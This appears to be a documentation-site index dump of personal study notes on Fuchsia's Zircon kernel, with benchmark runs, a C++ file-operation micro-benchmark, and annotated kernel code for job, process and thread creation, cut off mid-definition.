executable, in emulator shell. $ benchmark_test Run on ( 1 X 2592 .14 MHz CPU ) 2021 -09-06 11 :41:17 ***WARNING*** Library was built as DEBUG. Timings may be affected. Benchmark Time CPU Iterations ------------------------------------------------------------------------------- BM_Factorial 20 ns 20 ns 33472229 40320 BM_Factorial/real_time 20 ns 20 ns 35920865 40320 BM_CalculatePiRange/1 13 ns 13 ns 54041014 0 BM_CalculatePiRange/8 41 ns 41 ns 17306448 3 .28374 BM_CalculatePiRange/64 259 ns 259 ns 2660336 3 .15746 BM_CalculatePiRange/512 2016 ns 2016 ns 353513 3 .14355 BM_CalculatePiRange/4k 15967 ns 15967 ns 44053 3 .14184 BM_CalculatePiRange/32k 126546 ns 126546 ns 5487 3 .14162 BM_CalculatePiRange/256k 1012777 ns 1012781 ns 689 3 .1416 BM_CalculatePiRange/1024k 4095950 ns 4095971 ns 139 3 .14159 BM_CalculatePi/threads:8 789 ns 3954 ns 176368 BM_CalculatePi/threads:1 3975 ns 3975 ns 173389 BM_CalculatePi/threads:2 2001 ns 4003 ns 175916 BM_CalculatePi/threads:4 995 ns 3906 ns 177236 BM_CalculatePi/threads:8 753 ns 3841 ns 174008 BM_CalculatePi/threads:16 657 ns 4052 ns 166176 BM_CalculatePi/threads:32 256 ns 3899 ns 160064 BM_CalculatePi/threads:1 3941 ns 3941 ns 178150 BM_SetInsert/1024/1 62785 ns 62206 ns 11298 62 .7956kB/s 15 .6989k items/s BM_SetInsert/4k/1 252802 ns 251994 ns 2774 15 .5013kB/s 3 .87534k items/s BM_SetInsert/8k/1 529103 ns 526835 ns 1285 7 .41456kB/s 1 .85364k items/s BM_SetInsert/1024/8 68558 ns 68193 ns 10335 458 .256kB/s 114 .564k items/s BM_SetInsert/4k/8 268487 ns 266804 ns 2635 117 .127kB/s 29 .2818k items/s BM_SetInsert/8k/8 535696 ns 533019 ns 1323 58 .6283kB/s 14 .6571k items/s BM_SetInsert/1024/10 70453 ns 69789 ns 9930 559 .722kB/s 139 .931k items/s BM_SetInsert/4k/10 271270 ns 271624 ns 2553 143 .811kB/s 35 .9528k items/s BM_SetInsert/8k/10 535577 ns 533078 ns 1292 73 .2773kB/s 18 .3193k items/s BM_Sequential<std::vector<int>,int>/1 62 ns 62 ns 11171256 61 .4717MB/s 15 .3679M items/s BM_Sequential<std::vector<int>,int>/8 1510 ns 1510 ns 459005 20 .2076MB/s 5 .05191M items/s BM_Sequential<std::vector<int>,int>/64 4796 ns 4795 ns 146760 50 .9115MB/s 12 .7279M items/s BM_Sequential<std::vector<int>,int>/512 24337 ns 24337 ns 28851 80 .2538MB/s 20 .0635M items/s BM_Sequential<std::vector<int>,int>/1024 45693 ns 45693 ns 15478 85 .4887MB/s 21 .3722M items/s BM_Sequential<std::list<int>>/1 45 ns 45 ns 15432027 85 .3898MB/s 21 .3474M items/s BM_Sequential<std::list<int>>/8 1323 ns 1323 ns 495244 23 .0739MB/s 5 .76847M items/s BM_Sequential<std::list<int>>/64 11765 ns 11765 ns 60333 20 .7515MB/s 5 .18787M items/s BM_Sequential<std::list<int>>/512 94780 ns 94781 ns 7280 20 .6068MB/s 5 .1517M items/s BM_Sequential<std::list<int>>/1024 191727 ns 191728 ns 3681 20 .3739MB/s 5 .09349M items/s BM_Sequential<std::vector<int>, int>/512 24178 ns 24178 ns 29185 80 .7815MB/s 20 .1954M items/s BM_StringCompare/1 79 ns 79 ns 8741679 BM_StringCompare/8 83 ns 83 ns 7820085 BM_StringCompare/64 107 ns 107 ns 6417652 BM_StringCompare/512 323 ns 323 ns 2179937 Run our own component in /boot/bin . Copy the //example/hello_world/cpp to //src/bringup/bin/hello_world . Add the //src/bringup/bin/hello-world:bin to the dependencies of the zedboot group to //src/bringup/bundles/BUILD.gn . Then, we can even run the executable even with the bringup configuration. Write some micro-benches using the framework. Fuchsia and Linux have different ideas on the basic concepts. So, micro-benches using POSIX API cannot be ported. We must find the functional counterpart. Currently, we add a file operation test (the following code to //third_party/benchmark/syscall_test.cc ) as a micro-bench test. Then, we update the dependency of //third_party/benchmark/BUILD.gn . We can use dm <PATH> to see which file system is. I see /boot is memfs as expected, /data is minfs and others like /pkg and /bin are unknown. And the mkdir touch rm commands fail on these unknown areas. We might have to find out the reason . Also, we use more language-based standard library rather than something like unistd and libfdio for simplicity and generalization. #define USE_ZIRCON_ZX_SYSCALL #ifdef USE_ZIRCON_ZX_SYSCALL #include \"benchmark/benchmark_api.h\" #else #include \"benchmark/benchmark.h\" #endif #include <iostream> #include <fstream> namespace { // zircon use fdio.so library to do file operations, rather than posix api. // fdio knows how to speak to those other Fuchsia services over Channel IPC, // and provides a Posix-like layer for libc to expose. // Sockets are similarly implemented via fdio communicating with the userspace network stack. void file_write ( int file_size , benchmark :: State & state ) { char * buf = new char [ file_size ]; for ( int i = 0 ; i < file_size ; i ++ ) { if ( i % 2 == 0 ) buf [ i ] = 'A' ; else buf [ i ] = 'B' ; } std :: ofstream ofs ; state . ResumeTiming (); #ifdef USE_ZIRCON_ZX_SYSCALL ofs . open ( \"/data/test_file.txt\" ); #else ofs . open ( \"test_file.txt\" ); #endif if ( ofs . is_open ()) { ofs . write ( buf , file_size ); ofs . close (); } else { std :: cout << \"[error] in file write, cannot open file. \\n \" ; } state . PauseTiming (); delete [] buf ; } void file_read_rm ( int file_size , benchmark :: State & state ) { char * buf = new char [ file_size ]; std :: ifstream ifs ; state . ResumeTiming (); #ifdef USE_ZIRCON_ZX_SYSCALL ifs . open ( \"/data/test_file.txt\" ); #else ifs . open ( \"test_file.txt\" ); #endif if ( ifs . is_open ()) { ifs . read ( buf , file_size ); ifs . close (); } else { std :: cout << \"[error] in file read, cannot open file. \\n \" ; } state . PauseTiming (); delete [] buf ; } } static void BM_FileOp ( benchmark :: State & state ) { const int SZ_PAGE = 1024 ; while ( state . KeepRunning ()) { state . PauseTiming (); file_write ( state . range ( 0 ) * SZ_PAGE , state ); file_read_rm ( state . range ( 0 ) * SZ_PAGE , state ); state . ResumeTiming (); } } // test 1k, 10k and 1m file BENCHMARK ( BM_FileOp ) -> Arg ( 1 ) -> Arg ( 10 ) -> Arg ( 1000 ); BENCHMARK_MAIN (); #undef USE_ZIRCON_ZX_SYSCALL Then, run fx set core.qemu-x64 --with-base //bundles:tools and fx build . We use the core configuration because our NUC 9 can only run core configuration. Run on emulator to test it! $ benchmark Run on ( 1 X 2592 .13 MHz CPU ) 2021 -09-08 10 :42:36 ***WARNING*** Library was built as DEBUG. Timings may be affected. Benchmark Time CPU Iterations ----------------------------------------------------- BM_FileOp/1 29580839 ns 480812 ns 1000 BM_FileOp/10 36780568 ns 705535 ns 1035 BM_FileOp/1000 37059443 ns 8599233 ns 82 Run the same tests on both Linux and Zircon on the same Intel NUC (even with same devices). First, run it on Linux. 2021 -09-08T19:03:53+08:00 Running ./build/test/syscall_test Run on ( 12 X 4500 MHz CPU s ) CPU Caches: L1 Data 32 KiB ( x6 ) L1 Instruction 32 KiB ( x6 ) L2 Unified 256 KiB ( x6 ) L3 Unified 12288 KiB ( x1 ) Load Average: 0 .52, 0 .46, 0 .23 ***WARNING*** CPU scaling is enabled, the benchmark real time measurements may be noisy and will incur extra overhead. ***WARNING*** Library was built as DEBUG. Timings may be affected. --------------------------------------------------------- Benchmark Time CPU Iterations --------------------------------------------------------- BM_FileOp/1 36055 ns 26183 ns 26937 BM_FileOp/10 29221 ns 29032 ns 24282 BM_FileOp/1000 542094 ns 541968 ns 1243 Then, we must face the real block device. We just make a partition follow the instructions. How to run native debugger and tracer? Which part of Fuchsia consumes time? How does the kernel support the component manager?","title":"Run Component"},{"location":"play/task/","text":"Program execution. Job. Firstly, in front of the JobDispatcher, the author says. // This class implements the Job object kernel interface. Each Job has a parent // Job and zero or more child Jobs and zero or more Child processes. This // creates a DAG (tree) that connects every living task in the system. // This is critically important because of the bottoms up refcount nature of // the system in which the scheduler keeps alive the thread and the thread keeps // alive the process, so without the Job it would not be possible to enumerate // or control the tasks in the system for which there are no outstanding handles. // // The second important job of the Job is to apply policies that cannot otherwise // be easily enforced by capabilities, for example kernel object creation. // // The third one is to support exception propagation from the leaf tasks to // the root tasks. // // Obviously there is a special case for the 'root' Job which its parent is null // and in the current implementation will call platform_halt() when its process // and job count reaches zero. The root job is not exposed to user mode, instead // the single child Job of the root job is given to the userboot process. Create a Job. Get current process. Lookup the current process handle table to check if the reference has ZX_RIGHT_MANAGE_JOB . Get the pointer to the parent Job. Create a new Job with a kernel handle implementation and the rights. And then make the integer handle for user space. Here, the option is not used by the constructor of JobDispatcher and must be 0 . The RefPtr versus shared_ptr in C++ is in https://chunminchang.github.io/blog/post/refptr-v-s-shared-ptr. And handle->HasRights(desired_rights) is for rights checking. zx_status_t sys_job_create ( zx_handle_t parent_job , uint32_t options , user_out_handle * out ) { auto up = ProcessDispatcher :: GetCurrent (); fbl :: RefPtr < JobDispatcher > parent ; zx_status_t status = up -> handle_table (). GetDispatcherWithRights ( parent_job , ZX_RIGHT_MANAGE_JOB , & parent ); KernelHandle < JobDispatcher > handle ; zx_rights_t rights ; status = JobDispatcher :: Create ( options , ktl :: move ( parent ), & handle , & rights ); if ( status == ZX_OK ) status = out -> make ( ktl :: move ( handle ), rights ); return status ; } Here, I am interested in JobDispatcher::Create and out->make . We can see the Job tree has a max height. The constructor of new_handle and default_rights are interesting. In fact, the default_rights() is in //zircon/kernel/object/include/object/dispatcher.h . It returns def_rights which is defined in the template. For JobDispatcher, ZX_DEFAULT_JOB_RIGHTS is the right. zx_status_t JobDispatcher::Create ( uint32_t flags , const fbl :: RefPtr < JobDispatcher >& parent , KernelHandle < JobDispatcher >* handle , zx_rights_t * rights ) { if ( parent != nullptr && parent -> max_height () == 0 ) { return ZX_ERR_OUT_OF_RANGE ; } fbl :: AllocChecker ac ; KernelHandle new_handle ( fbl :: AdoptRef ( new ( & ac ) JobDispatcher ( flags , parent , parent -> GetPolicy ()))); if ( ! ac . check ()) return ZX_ERR_NO_MEMORY ; if ( ! parent -> AddChildJob ( new_handle . dispatcher ())) { return ZX_ERR_BAD_STATE ; } * rights = default_rights (); * handle = ktl :: move ( new_handle ); return ZX_OK ; } For the KernelHandle (a representation of handle in kernel space), is just a class, with a reference pointer ( fbl::RefPtr<T> dispatcher_ ) to the object. The author says as below. Here, the handler is only a kernel object with a reference. Only before it is given to the process will it have rights and owner. // A minimal wrapper around a Dispatcher which is owned by the kernel. // // Intended usage when creating new a Dispatcher object is: // 1. Create a KernelHandle on the stack (cannot fail) // 2. Move the RefPtr<Dispatcher> into the KernelHandle (cannot fail) // 3. When ready to give the handle to a process, upgrade the KernelHandle // to a full HandleOwner via UpgradeToHandleOwner() or // user_out_handle::make() (can fail) // // This sequence ensures that the Dispatcher's on_zero_handles() method is // called even if errors occur during or before HandleOwner creation, which // is necessary to break circular references for some Dispatcher types. // // This class is thread-unsafe and must be externally synchronized if used // across multiple threads. For the handle's owner, use user_out_handle::make(ktl::move(handle), rights) as an example. The definition is in //zircon/kernel/lib/syscalls/priv.h . It uses the KernelHandle or Dispatcher reference along with rights to Make() a Handle. // This is the type of handle result parameters in system call // implementation functions (sys_*). kazoo recognizes return values of // type zx_handle_t and converts them into user_out_handle* instead of into // user_out_ptr<zx_handle_t>. System call implementation functions use the // make, dup, or transfer method to turn a Dispatcher pointer or another // handle into a handle received by the user. class user_out_handle final { public : zx_status_t make ( fbl :: RefPtr < Dispatcher > dispatcher , zx_rights_t rights ) { h_ = Handle :: Make ( ktl :: move ( dispatcher ), rights ); return h_ ? ZX_OK : ZX_ERR_NO_MEMORY ; } // Note that if this call fails to allocate the Handle, the underlying // Dispatcher's on_zero_handles() will be called. zx_status_t make ( KernelHandle < Dispatcher > handle , zx_rights_t rights ) { h_ = Handle :: Make ( ktl :: move ( handle ), rights ); return h_ ? ZX_OK : ZX_ERR_NO_MEMORY ; } ... private : HandleOwner h_ ; } A Handle is how a specific process refers to a specific Dispatcher. HandleOwner wraps a Handle in a unique_ptr that has single ownership of the Handle and deletes it whenever it falls out of scope ( HandleOwner = ktl::unique_ptr<Handle, HandleDestroyer> ). Handles should only be created by Make or Dup(licate) . In //zircon/kernel/object/include/object/handle.h , the code is. HandleOwner Handle::Make ( KernelHandle < Dispatcher > kernel_handle , zx_rights_t rights ) { uint32_t base_value ; void * addr = gHandleTableArena . Alloc ( kernel_handle . dispatcher (), \"new\" , & base_value ); if ( unlikely ( ! addr )) return nullptr ; kcounter_add ( handle_count_made , 1 ); kcounter_add ( handle_count_live , 1 ); return HandleOwner ( new ( addr ) Handle ( kernel_handle . release (), rights , base_value )); } Handle :: Handle ( fbl :: RefPtr < Dispatcher > dispatcher , zx_rights_t rights , uint32_t base_value ) : process_id_ ( ZX_KOID_INVALID ), dispatcher_ ( ktl :: move ( dispatcher )), rights_ ( rights ), base_value_ ( base_value ) {} When a JobDispatcher is constructed and added to its parent Job, the new job is after the parent's next-youngest child, or us if we have none. The handle can only get a RefPtr of JobDispatcher, which makes sense. So we use handle.dispatcher.get to get the pointer of the Job, which is JobDispatcher* . c++ JobDispatcher::JobDispatcher(uint32_t /*flags*/, fbl::RefPtr<JobDispatcher> parent, JobPolicy policy) : SoloDispatcher(ZX_JOB_NO_PROCESSES | ZX_JOB_NO_JOBS | ZX_JOB_NO_CHILDREN), parent_(ktl::move(parent)), max_height_(parent_ ? parent_->max_height() - 1 : kRootJobMaxHeight), state_(State::READY), return_code_(0), kill_on_oom_(false), policy_(policy), exceptionate_(ZX_EXCEPTION_CHANNEL_TYPE_JOB), debug_exceptionate_(ZX_EXCEPTION_CHANNEL_TYPE_JOB_DEBUGGER) { kcounter_add(dispatcher_job_create_count, 1); } Process. First, the definition of ProcessDispatcher is in //zircon/kernel/object/include/object/process_dispatcher.h . Create a process. zx_status_t sys_process_create ( zx_handle_t job_handle , user_in_ptr < const char > _name , size_t name_len , uint32_t options , user_out_handle * proc_handle , user_out_handle * vmar_handle ) { // some basic things // copy out the name char buf [ ZX_MAX_NAME_LEN ]; ktl :: string_view sp ; result = copy_user_string ( _name , name_len , buf , sizeof ( buf ), & sp ); fbl :: RefPtr < JobDispatcher > job ; auto status = up -> handle_table (). GetDispatcherWithRights ( job_handle , ZX_RIGHT_MANAGE_PROCESS , & job ); // create a new process dispatcher KernelHandle < ProcessDispatcher > new_process_handle ; KernelHandle < VmAddressRegionDispatcher > new_vmar_handle ; zx_rights_t proc_rights , vmar_rights ; result = ProcessDispatcher :: Create ( ktl :: move ( job ), sp , options , & new_process_handle , & proc_rights , & new_vmar_handle , & vmar_rights ); result = proc_handle -> make ( ktl :: move ( new_process_handle ), proc_rights ); if ( result == ZX_OK ) result = vmar_handle -> make ( ktl :: move ( new_vmar_handle ), vmar_rights ); return result ; } In this process creation, ProcessDispatcher::Create is the core function. In the creation of ProcessDispatcher. zx_status_t ProcessDispatcher::Create ( fbl :: RefPtr < JobDispatcher > job , ktl :: string_view name , uint32_t flags , KernelHandle < ProcessDispatcher >* handle , zx_rights_t * rights , KernelHandle < VmAddressRegionDispatcher >* root_vmar_handle , zx_rights_t * root_vmar_rights ) { fbl :: AllocChecker ac ; KernelHandle new_handle ( fbl :: AdoptRef ( new ( & ac ) ProcessDispatcher ( job , name , flags ))); zx_status_t result = new_handle . dispatcher () -> Initialize (); // Create a dispatcher for the root VMAR. KernelHandle < VmAddressRegionDispatcher > new_vmar_handle ; result = VmAddressRegionDispatcher :: Create ( new_handle . dispatcher () -> aspace () -> RootVmar (), ARCH_MMU_FLAG_PERM_USER , & new_vmar_handle , root_vmar_rights ); // Only now that the process has been fully created and initialized can we register it with its // parent job. We don't want anyone to see it in a partially initalized state. if ( ! job -> AddChildProcess ( new_handle . dispatcher ())) { return ZX_ERR_BAD_STATE ; } * rights = default_rights (); * handle = ktl :: move ( new_handle ); * root_vmar_handle = ktl :: move ( new_vmar_handle ); return ZX_OK ; } Here, we are interested in 2 functionalities. What initialization should the process do ( dispatcher()->Initialize() )? How does the VmAddressRegionDispatcher::Create work and how it relates to the new process? Here comes the initialization step. The calling tree is ProcessDiapatcher::Initialize -> VmAspace::Create -> VmAspace::Init . Specifically, the constructor of VmAspace is a initialization list as below. VmAspace :: VmAspace ( vaddr_t base , size_t size , uint32_t flags , const char * name ) : base_ ( base ), size_ ( size ), flags_ ( flags ), root_vmar_ ( nullptr ), aslr_prng_ ( nullptr , 0 ), arch_aspace_ ( base , size , arch_aspace_flags_from_flags ( flags )) { DEBUG_ASSERT ( size != 0 ); DEBUG_ASSERT ( base + size - 1 >= base ); Rename ( name ); } // Fun 1 zx_status_t ProcessDispatcher::Initialize () { LTRACE_ENTRY_OBJ ; Guard < Mutex > guard { get_lock ()}; // create an address space for this process, named after the process's koid. char aspace_name [ ZX_MAX_NAME_LEN ]; snprintf ( aspace_name , sizeof ( aspace_name ), \"proc:%\" PRIu64 , get_koid ()); aspace_ = VmAspace :: Create ( VmAspace :: TYPE_USER , aspace_name ); if ( ! aspace_ ) { return ZX_ERR_NO_MEMORY ; } return ZX_OK ; } // Fun 2 fbl :: RefPtr < VmAspace > VmAspace :: Create ( uint32_t flags , const char * name ) { LTRACEF ( \"flags 0x%x, name '%s' \\n \" , flags , name ); vaddr_t base ; size_t size ; switch ( flags & TYPE_MASK ) { case TYPE_USER : base = USER_ASPACE_BASE ; size = USER_ASPACE_SIZE ; break ; case TYPE_KERNEL : base = KERNEL_ASPACE_BASE ; size = KERNEL_ASPACE_SIZE ; break ; case TYPE_LOW_KERNEL : base = 0 ; size = USER_ASPACE_BASE + USER_ASPACE_SIZE ; break ; case TYPE_GUEST_PHYS : base = GUEST_PHYSICAL_ASPACE_BASE ; size = GUEST_PHYSICAL_ASPACE_SIZE ; break ; default : panic ( \"Invalid aspace type\" ); } fbl :: AllocChecker ac ; auto aspace = fbl :: AdoptRef ( new ( & ac ) VmAspace ( base , size , flags , name )); if ( ! ac . check ()) { return nullptr ; } // initialize the arch specific component to our address space zx_status_t status = aspace -> Init (); if ( status != ZX_OK ) { status = aspace -> Destroy (); DEBUG_ASSERT ( status == ZX_OK ); return nullptr ; } // add it to the global list { Guard < Mutex > guard { & aspace_list_lock }; aspaces . push_back ( aspace . get ()); } // return a ref pointer to the aspace return aspace ; } The third function in the calling tree is worth mentioning. For the architectural specific part, arch_aspace_.Init , if we taken X86 as an example, we can find the function X86ArchVmAspace::Init in //zircon/kernel/arch/x86/mmu.cc . Zircon uses ASLR to mitigate spatial memory corruption. For a process, the root VMAR covers the entire address space. zx_status_t VmAspace::Init () { canary_ . Assert (); // initialize the architecturally specific part zx_status_t status = arch_aspace_ . Init (); InitializeAslr (); if ( likely ( ! root_vmar_ )) { return VmAddressRegion :: CreateRoot ( * this , VMAR_FLAG_CAN_MAP_SPECIFIC , & root_vmar_ ); } return ZX_OK ; } /* * Fill in the high level x86 arch aspace structure and allocating a top level page table. */ zx_status_t X86ArchVmAspace::Init () { static_assert ( sizeof ( cpu_mask_t ) == sizeof ( active_cpus_ ), \"err\" ); canary_ . Assert (); LTRACEF ( \"aspace %p, base %#\" PRIxPTR \", size 0x%zx, mmu_flags 0x%x \\n \" , this , base_ , size_ , flags_ ); if ( flags_ & ARCH_ASPACE_FLAG_KERNEL ) { X86PageTableMmu * mmu = new ( & page_table_storage_ . mmu ) X86PageTableMmu (); pt_ = mmu ; zx_status_t status = mmu -> InitKernel ( this , test_page_alloc_func_ ); if ( status != ZX_OK ) { return status ; } LTRACEF ( \"kernel aspace: pt phys %#\" PRIxPTR \", virt %p \\n \" , pt_ -> phys (), pt_ -> virt ()); } else if ( flags_ & ARCH_ASPACE_FLAG_GUEST ) { X86PageTableEpt * ept = new ( & page_table_storage_ . ept ) X86PageTableEpt (); pt_ = ept ; zx_status_t status = ept -> Init ( this , test_page_alloc_func_ ); if ( status != ZX_OK ) { return status ; } LTRACEF ( \"guest paspace: pt phys %#\" PRIxPTR \", virt %p \\n \" , pt_ -> phys (), pt_ -> virt ()); } else { X86PageTableMmu * mmu = new ( & page_table_storage_ . mmu ) X86PageTableMmu (); pt_ = mmu ; zx_status_t status = mmu -> Init ( this , test_page_alloc_func_ ); if ( status != ZX_OK ) { return status ; } status = mmu -> AliasKernelMappings (); if ( status != ZX_OK ) { return status ; } LTRACEF ( \"user aspace: pt phys %#\" PRIxPTR \", virt %p \\n \" , pt_ -> phys (), pt_ -> virt ()); } ktl :: atomic_init ( & active_cpus_ , 0 ); return ZX_OK ; } Start a process. The first argument ( arg1 ) is a handle, which will be transferred from the process of the caller to the process being started, and an appropriate handle value will be placed in arg1 for the newly started thread. zx_process_start() is the only way to transfer a handle into a process that doesn't involve the process making some system call using a handle it already has. A process with no handles can make the few system calls that don't require a handle. So, the main question is, can we give an example to specify what arg1 and arg2 are. According to the tests in Fuchsia, most arg1s are Events defined in Zircon. Here, currently I have no idea why we give the new process an Event handle and how to use this to, let's say, get the handle of its parent job and create another job or process. zx_status_t sys_process_start ( zx_handle_t process_handle , zx_handle_t thread_handle , zx_vaddr_t pc , zx_vaddr_t sp , zx_handle_t arg_handle_value , uintptr_t arg2 ) { auto up = ProcessDispatcher :: GetCurrent (); // get process dispatcher fbl :: RefPtr < ProcessDispatcher > process ; zx_status_t status = up -> handle_table (). GetDispatcherWithRights ( process_handle , ZX_RIGHT_WRITE , & process ); // get thread_dispatcher fbl :: RefPtr < ThreadDispatcher > thread ; status = up -> handle_table (). GetDispatcherWithRights ( thread_handle , ZX_RIGHT_WRITE , & thread ); HandleOwner arg_handle = up -> handle_table (). RemoveHandle ( arg_handle_value ); // test that the thread belongs to the starting process if ( thread -> process () != process . get ()) return ZX_ERR_ACCESS_DENIED ; zx_handle_t arg_nhv = ZX_HANDLE_INVALID ; if ( arg_handle ) { arg_nhv = process -> handle_table (). MapHandleToValue ( arg_handle ); process -> handle_table (). AddHandle ( ktl :: move ( arg_handle )); } status = thread -> Start ( ThreadDispatcher :: EntryState { pc , sp , static_cast < uintptr_t > ( arg_nhv ), arg2 }, /* initial_thread */ true ); return ZX_OK ; } Thread. To begin with, Zircon Threads are detached (not need to wait for join to release resource), by POSIX API may needs join. Create and start. Thread creation is similar. And the options must be 0 as well. The difference lies in the Processes and Jobs are listed in Jobs as a fat-wide tree structure. So, we only need to dive into ThreadDispatcher::Create and handle.dispatcher()->Initialize() . zx_status_t sys_thread_create ( zx_handle_t process_handle , user_in_ptr < const char > _name , size_t name_len , uint32_t options , user_out_handle * out ) { // copy out the name char buf [ ZX_MAX_NAME_LEN ]; ktl :: string_view sp ; zx_status_t result = copy_user_string ( _name , name_len , buf , sizeof ( buf ), & sp ); // convert process handle to process dispatcher auto up = ProcessDispatcher :: GetCurrent (); fbl :: RefPtr < ProcessDispatcher > process ; result = up -> handle_table (). GetDispatcherWithRights ( process_handle , ZX_RIGHT_MANAGE_THREAD , & process ); // create the thread dispatcher KernelHandle < ThreadDispatcher > handle ; zx_rights_t thread_rights ; result = ThreadDispatcher :: Create ( ktl :: move ( process ), options , sp , & handle , & thread_rights ); if ( result != ZX_OK ) return result ; result = handle . dispatcher () -> Initialize (); return out -> make ( ktl :: move ( handle ), thread_rights ); } In Thread creation, first we need to know how Process and Thread are related. Then, we must know the definition of user_thread and core_thread . Thread knows its parent's Process and the Process can access all threads from the first one by one. user_thread is the dispatcher and core_thread is for kernel and scheduler. In the creation, the pointer t is nullptr. Further reading about core_thread will be in scheduling. zx_status_t ThreadDispatcher::Create ( fbl :: RefPtr < ProcessDispatcher > process , uint32_t flags , ktl :: string_view name , KernelHandle < ThreadDispatcher >* out_handle , zx_rights_t * out_rights ) { // Create the user-mode thread and attach it to the process and lower level thread. fbl :: AllocChecker ac ; auto user_thread = fbl :: AdoptRef ( new ( & ac ) ThreadDispatcher ( process , flags )); // Create the lower level thread and attach it to the scheduler. Thread * core_thread = Thread :: Create ( name . data (), StartRoutine , user_thread . get (), DEFAULT_PRIORITY ); // We haven't yet compeleted initialization of |user_thread|, and // references to it haven't possibly escaped this thread. We can // safely set |core_thread_| outside the lock. [ & user_thread , & core_thread ]() TA_NO_THREAD_SAFETY_ANALYSIS { user_thread -> core_thread_ = core_thread ; }(); // The syscall layer will call Initialize(), which used to be called here. * out_rights = default_rights (); * out_handle = KernelHandle ( ktl :: move ( user_thread )); return ZX_OK ; } Thread * Thread::CreateEtc ( Thread * t , const char * name , thread_start_routine entry , void * arg , int priority , thread_trampoline_routine alt_trampoline ) { unsigned int flags = 0 ; if ( ! t ) { t = static_cast < Thread *> ( memalign ( alignof ( Thread ), sizeof ( Thread ))); if ( ! t ) { return nullptr ; } flags |= THREAD_FLAG_FREE_STRUCT ; } init_thread_struct ( t , name ); t -> task_state_ . Init ( entry , arg ); Scheduler :: InitializeThread ( t , priority ); zx_status_t status = t -> stack_ . Init (); if ( status != ZX_OK ) { if ( flags & THREAD_FLAG_FREE_STRUCT ) { free ( t ); } return nullptr ; } // save whether or not we need to free the thread struct and/or stack t -> flags_ = flags ; if ( likely ( alt_trampoline == nullptr )) { alt_trampoline = & Thread :: Trampoline ; } // set up the initial stack frame arch_thread_initialize ( t , ( vaddr_t ) alt_trampoline ); // add it to the global thread list { Guard < MonitoredSpinLock , IrqSave > guard { ThreadLock :: Get (), SOURCE_TAG }; thread_list -> push_front ( t ); } kcounter_add ( thread_create_count , 1 ); return t ; } When starting a Thread, it finally calls Start . We can see, the initial thread must be started by the Process, and others must be started by a Thread. Of-course, arg1 and arg2 are directly sent to the entry function. zx_status_t sys_thread_start ( zx_handle_t handle , zx_vaddr_t thread_entry , zx_vaddr_t stack , uintptr_t arg1 , uintptr_t arg2 ) { auto up = ProcessDispatcher :: GetCurrent (); fbl :: RefPtr < ThreadDispatcher > thread ; zx_status_t status = up -> handle_table (). GetDispatcherWithRights ( handle , ZX_RIGHT_MANAGE_THREAD , & thread ); return thread -> Start ( ThreadDispatcher :: EntryState { thread_entry , stack , arg1 , arg2 }, /* initial_thread= */ false ); } Access thread state system calls are for debugging and can be accessed only when the thread is suspended or has an exception.","title":"Program execution."},{"location":"play/task/#program-execution","text":"Job. Firstly, in front of the JobDispatcher, the author says. // This class implements the Job object kernel interface. Each Job has a parent // Job and zero or more child Jobs and zero or more Child processes. This // creates a DAG (tree) that connects every living task in the system. // This is critically important because of the bottoms up refcount nature of // the system in which the scheduler keeps alive the thread and the thread keeps // alive the process, so without the Job it would not be possible to enumerate // or control the tasks in the system for which there are no outstanding handles. // // The second important job of the Job is to apply policies that cannot otherwise // be easily enforced by capabilities, for example kernel object creation. // // The third one is to support exception propagation from the leaf tasks to // the root tasks. // // Obviously there is a special case for the 'root' Job which its parent is null // and in the current implementation will call platform_halt() when its process // and job count reaches zero. The root job is not exposed to user mode, instead // the single child Job of the root job is given to the userboot process. Create a Job. Get current process. Lookup the current process handle table to check if the reference has ZX_RIGHT_MANAGE_JOB . Get the pointer to the parent Job. Create a new Job with a kernel handle implementation and the rights. And then make the integer handle for user space. Here, the option is not used by the constructor of JobDispatcher and must be 0 . The RefPtr versus shared_ptr in C++ is in https://chunminchang.github.io/blog/post/refptr-v-s-shared-ptr. And handle->HasRights(desired_rights) is for rights checking. zx_status_t sys_job_create ( zx_handle_t parent_job , uint32_t options , user_out_handle * out ) { auto up = ProcessDispatcher :: GetCurrent (); fbl :: RefPtr < JobDispatcher > parent ; zx_status_t status = up -> handle_table (). GetDispatcherWithRights ( parent_job , ZX_RIGHT_MANAGE_JOB , & parent ); KernelHandle < JobDispatcher > handle ; zx_rights_t rights ; status = JobDispatcher :: Create ( options , ktl :: move ( parent ), & handle , & rights ); if ( status == ZX_OK ) status = out -> make ( ktl :: move ( handle ), rights ); return status ; } Here, I am interested in JobDispatcher::Create and out->make . We can see the Job tree has a max height. The constructor of new_handle and default_rights are interesting. In fact, the default_rights() is in //zircon/kernel/object/include/object/dispatcher.h . It returns def_rights which is defined in the template. For JobDispatcher, ZX_DEFAULT_JOB_RIGHTS is the right. zx_status_t JobDispatcher::Create ( uint32_t flags , const fbl :: RefPtr < JobDispatcher >& parent , KernelHandle < JobDispatcher >* handle , zx_rights_t * rights ) { if ( parent != nullptr && parent -> max_height () == 0 ) { return ZX_ERR_OUT_OF_RANGE ; } fbl :: AllocChecker ac ; KernelHandle new_handle ( fbl :: AdoptRef ( new ( & ac ) JobDispatcher ( flags , parent , parent -> GetPolicy ()))); if ( ! ac . check ()) return ZX_ERR_NO_MEMORY ; if ( ! parent -> AddChildJob ( new_handle . dispatcher ())) { return ZX_ERR_BAD_STATE ; } * rights = default_rights (); * handle = ktl :: move ( new_handle ); return ZX_OK ; } For the KernelHandle (a representation of handle in kernel space), is just a class, with a reference pointer ( fbl::RefPtr<T> dispatcher_ ) to the object. The author says as below. Here, the handler is only a kernel object with a reference. Only before it is given to the process will it have rights and owner. // A minimal wrapper around a Dispatcher which is owned by the kernel. // // Intended usage when creating new a Dispatcher object is: // 1. Create a KernelHandle on the stack (cannot fail) // 2. Move the RefPtr<Dispatcher> into the KernelHandle (cannot fail) // 3. When ready to give the handle to a process, upgrade the KernelHandle // to a full HandleOwner via UpgradeToHandleOwner() or // user_out_handle::make() (can fail) // // This sequence ensures that the Dispatcher's on_zero_handles() method is // called even if errors occur during or before HandleOwner creation, which // is necessary to break circular references for some Dispatcher types. // // This class is thread-unsafe and must be externally synchronized if used // across multiple threads. For the handle's owner, use user_out_handle::make(ktl::move(handle), rights) as an example. The definition is in //zircon/kernel/lib/syscalls/priv.h . It uses the KernelHandle or Dispatcher reference along with rights to Make() a Handle. // This is the type of handle result parameters in system call // implementation functions (sys_*). kazoo recognizes return values of // type zx_handle_t and converts them into user_out_handle* instead of into // user_out_ptr<zx_handle_t>. System call implementation functions use the // make, dup, or transfer method to turn a Dispatcher pointer or another // handle into a handle received by the user. class user_out_handle final { public : zx_status_t make ( 